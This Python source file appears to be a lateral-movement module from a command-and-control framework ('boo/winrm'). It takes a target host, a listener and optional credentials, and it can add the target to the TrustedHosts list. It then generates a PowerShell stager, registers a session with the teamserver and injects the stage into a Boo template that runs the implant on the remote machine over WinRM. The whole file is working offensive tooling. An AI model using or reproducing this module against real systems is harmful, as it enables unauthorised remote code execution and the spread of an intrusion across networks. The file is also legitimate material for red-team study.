import core.events as events
from core.utils import print_bad
from core.teamserver import ipc_server
from core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/winrm'
        self.language = 'boo'
        self.description = 'Move laterally using winrm'
        self.author = '@byt3bl33d3r'
        self.references = ["System.Management.Automation"]
        self.options = {
            'Host': {
                'Description'   :   'Target IP or Hostname',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener': {
                'Description'   :   'Listener Name',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Username': {
                'Description'   :   'Optional alternative username to use for the WinRM connection',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Domain': {
                'Description'   :   'Optional alternative Domain of the username to use for the WinRM connection',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password': {
                'Description'   :   'Optional password to authenticate the user for the WinRM connection',
                'Required'      :   False,
                'Value'         :   ''
            },
            'AddToTrustedHosts': {
                'Description'   :    'Add target host to the TrustedHost list before executing',
                'Required'      :    False,
                'Value'         :    False,
            }
        }

    def payload(self):
        stager = ipc_server.publish_event(events.GET_STAGERS, ('powershell',))
        listener = ipc_server.publish_event(events.GET_LISTENERS, (self.options['Listener']['Value'],))

        if stager and listener:
            stager.options['AsFunction']['Value'] = False

            with open('core/teamserver/modules/boo/src/winrm.boo', 'r') as module_src:
                guid, psk, stage = stager.generate(listener)
                ipc_server.publish_event(events.SESSION_REGISTER, (guid, psk))

                src = module_src.read()
                src = src.replace('TARGET', self.options['Host']['Value'])
                src = src.replace('USERNAME', self.options['Username']['Value'])
                src = src.replace('DOMAIN', self.options['Domain']['Value'])
                src = src.replace('PASSWORD', self.options['Password']['Value'])
                src = src.replace('TRUSTED_HOSTS', str(self.options['AddToTrustedHosts']['Value']).lower())
                src = src.replace('PAYLOAD', stage)
                return src

        print_bad('Invalid stager/listener selected')
